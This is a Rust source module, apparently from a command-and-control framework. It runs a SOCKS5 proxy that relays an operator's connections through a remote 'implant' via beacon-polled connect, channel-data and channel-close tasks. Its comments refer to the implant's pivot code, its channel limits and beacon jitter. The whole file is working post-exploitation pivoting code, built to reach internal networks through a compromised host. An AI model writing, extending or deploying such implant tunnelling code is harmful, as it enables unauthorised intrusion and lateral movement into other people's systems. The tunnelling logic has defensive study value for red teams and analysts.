//! Per-connection state machine for one inbound SOCKS5 client.
//!
//! One [`handle_conn`] task is spawned per accepted SOCKS connection. It runs
//! the handshake, opens an implant channel (server-allocated chan via
//! `connect`), waits for the open-confirmation (`status:0`), then ferries bytes
//! both ways until either half closes.
//!
//! ## Open-confirmation race
//! The implant emits `status:0` (open) exactly ONCE as the Connect task's
//! response. If the poll loop drains it before this task registers its chan,
//! the open signal would be lost → spurious 30s timeout. The fix is in
//! [`super::BridgeCtx`]'s `ChanTable`: the poll loop buffers a seen-open chan
//! in `seen_open` when no consumer is registered yet, and this task picks it up
//! atomically at registration (same `Mutex`). Either ordering works.
//!
//! ## Concurrency
//! After the handshake the stream is `split` into read + write halves and a
//! single `tokio::select!` drives both directions: SOCKS-client bytes →
//! `channeldata` tasks (read half), and `ChannelMsg::Data` (from the poll loop,
//! demuxed by chan) → SOCKS-client writes (write half). Whichever half ends
//! first tears the channel down.

use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc;

use crate::socks::handshake;
use crate::socks::{api, BridgeCtx};

/// A message from the shared poll loop to one connection's task, keyed by chan.
/// The `chan` field is carried for debug logging (the consumer already knows
/// its own chan), hence the `dead_code` allow.
#[derive(Debug)]
#[allow(dead_code)]
pub enum ChannelMsg {
    /// `status:0` — the implant opened the target socket. Sent at most once.
    Open(u32),
    /// `status:1` — target→operator bytes (write them to the SOCKS client).
    Data(u32, Vec<u8>),
    /// `status:2` — peer closed the target connection cleanly.
    Closed(u32),
    /// `status:3` — channel error (e.g. send failed on the implant).
    Error(u32),
}

/// How long to wait for the `status:0` open-confirmation before giving up. The
/// implant's own connect timeout is 5s (pivot.rs); this covers one beacon
/// sleep+jitter cycle on top.
const OPEN_DEADLINE: Duration = Duration::from_secs(30);

/// Drive one SOCKS5 connection end-to-end. Logs outcomes to stderr; never
/// panics (a panicked conn task would only kill that one connection, but the
/// server must stay robust to malformed clients).
pub async fn handle_conn(mut stream: TcpStream, ctx: Arc<BridgeCtx>) {
    // ---- handshake ----
    if handshake::read_greeting(&mut stream, ctx.socks_auth.as_ref())
        .await
        .is_err()
    {
        return;
    }
    let (target, port) = match handshake::read_request(&mut stream).await {
        Ok(t) => t,
        Err(_) => return, // failure reply already written inside read_request
    };
    if !target.implant_reachable() {
        ctx.log(&format!(
            "[socks] warning: target {} is not IPv4 — implant is IPv4-only (inet_addr); connect will fail",
            target.to_host()
        ));
    }

    // ---- cap (client-side headroom under the implant's MAX_CHANNELS=16) ----
    if ctx.active.load(Ordering::Acquire) >= ctx.max_chan {
        ctx.log(&format!(
            "[socks] rejecting connection: channel cap ({}) reached",
            ctx.max_chan
        ));
        let _ = handshake::write_reply_failure(&mut stream, 0x05).await;
        return;
    }

    // ---- open an implant channel (server allocates the chan id) ----
    let host = target.to_host();
    let (task_id, chan) = match api::enqueue_connect(
        &ctx.client,
        &ctx.server,
        &ctx.session,
        &host,
        port,
        &ctx.token,
    )
    .await
    {
        Ok(x) => x,
        Err(e) => {
            ctx.log(&format!(
                "[socks] connect enqueue to {host}:{port} failed: {e}"
            ));
            let _ = handshake::write_reply_failure(&mut stream, 0x05).await;
            return;
        }
    };
    ctx.log(&format!("[socks] chan {chan}: opening to {host}:{port}"));

    // ---- register as the chan's consumer (atomic w/ the poll loop) ----
    let (tx, mut rx) = mpsc::channel::<ChannelMsg>(64);
    let already_open = {
        let mut g = ctx.chans.lock().unwrap();
        g.by_chan.insert(chan, tx);
        g.seen_open.remove(&chan)
    };
    ctx.task_to_chan.lock().unwrap().insert(task_id, chan);
    ctx.active.fetch_add(1, Ordering::AcqRel);

    // ---- wait for open-confirmation (status:0) ----
    let opened = if already_open {
        true
    } else {
        match tokio::time::timeout(OPEN_DEADLINE, rx.recv()).await {
            Ok(Some(ChannelMsg::Open(_))) => true,
            Ok(Some(other)) => {
                // An early Data/Closed/Error before Open means the channel is
                // already dead (e.g. status:3 from a failed connect).
                ctx.log(&format!(
                    "[socks] chan {chan}: got {other:?} before open — failing"
                ));
                false
            }
            Ok(None) => false, // poll loop dropped our sender (shouldn't happen)
            Err(_) => {
                ctx.log(&format!(
                    "[socks] chan {chan}: open-confirmation timed out ({:?})",
                    OPEN_DEADLINE
                ));
                false
            }
        }
    };

    if !opened {
        let _ = handshake::write_reply_failure(&mut stream, 0x05).await;
        cleanup(&ctx, chan).await;
        return;
    }
    if handshake::write_reply_success(&mut stream).await.is_err() {
        cleanup(&ctx, chan).await;
        return;
    }
    ctx.log(&format!("[socks] chan {chan}: open → ferrying"));

    // ---- bidirectional ferry ----
    let (mut r, mut w) = tokio::io::split(stream);
    let mut buf = vec![0u8; 16 * 1024];
    loop {
        tokio::select! {
            // target → operator (poll loop delivered bytes) → write to SOCKS client
            msg = rx.recv() => {
                match msg {
                    Some(ChannelMsg::Data(_, data)) => {
                        if w.write_all(&data).await.is_err() {
                            break;
                        }
                    }
                    Some(ChannelMsg::Closed(_)) => {
                        ctx.log(&format!("[socks] chan {chan}: peer closed"));
                        break;
                    }
                    Some(ChannelMsg::Error(_)) => {
                        ctx.log(&format!("[socks] chan {chan}: channel error"));
                        break;
                    }
                    Some(ChannelMsg::Open(_)) => {
                        // Duplicate open — ignore (the poll loop may redeliver).
                    }
                    None => break, // poll loop removed us
                }
            }
            // SOCKS client → operator → enqueue channeldata → target
            n = r.read(&mut buf) => {
                match n {
                    Ok(0) => {
                        // Client closed — tell the implant to tear down its socket.
                        ctx.log(&format!("[socks] chan {chan}: client EOF"));
                        break;
                    }
                    Ok(n) => {
                        if api::enqueue_channel_data(
                            &ctx.client, &ctx.server, &ctx.session, chan, &buf[..n], &ctx.token,
                        ).await.is_err() {
                            ctx.log(&format!("[socks] chan {chan}: channeldata enqueue failed — tearing down"));
                            break;
                        }
                    }
                    Err(e) => {
                        ctx.log(&format!("[socks] chan {chan}: socks read error: {e}"));
                        break;
                    }
                }
            }
        }
    }

    cleanup(&ctx, chan).await;
}

/// Remove the chan from the shared table + best-effort enqueue a channelclose +
/// decrement the active counter. Idempotent w.r.t. the poll loop (which also
/// removes on status 2/3) — `HashMap::remove` on a missing key is a no-op.
async fn cleanup(ctx: &BridgeCtx, chan: u32) {
    ctx.chans.lock().unwrap().by_chan.remove(&chan);
    let _ =
        api::enqueue_channel_close(&ctx.client, &ctx.server, &ctx.session, chan, &ctx.token).await;
    ctx.active.fetch_sub(1, Ordering::AcqRel);
}
